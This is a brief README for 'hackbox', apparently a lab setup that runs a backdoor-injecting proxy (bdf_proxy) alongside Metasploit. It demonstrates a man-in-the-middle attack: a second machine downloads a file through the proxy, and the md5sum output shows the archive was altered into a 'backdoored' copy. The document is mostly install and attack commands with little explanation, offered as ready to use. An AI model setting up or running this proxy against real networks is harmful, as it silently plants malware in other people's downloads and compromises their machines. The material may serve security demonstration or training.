hackbox
=======

## Install
```ssh root@hackbox
cd /tmp/
git clone https://github.com/quarantin/hackbox
cd hackbox
./scripts/provision.sh
```


## Usage
```
ssh hx@hackbox
screen
```
### TAB1
```
cd hackbox.git
python3 manage.py bdf_proxy
```
### TAB2
```
cd hackbox.git
python3 manage.py msf
```

## From other box
### Safe Download
```
wget http://www.fourmilab.ch/md5/md5.zip
```
### Backdoored Download
```
export http_proxy=hackbox:8080
wget http://www.fourmilab.ch/md5/md5.zip
```
### Compare archives
```
md5sum md5.zip*
f0d79822deea6229d87911eb156fda65  md5.zip
a3376fee2582b816d500a26128c5e82c  md5.zip.1
```
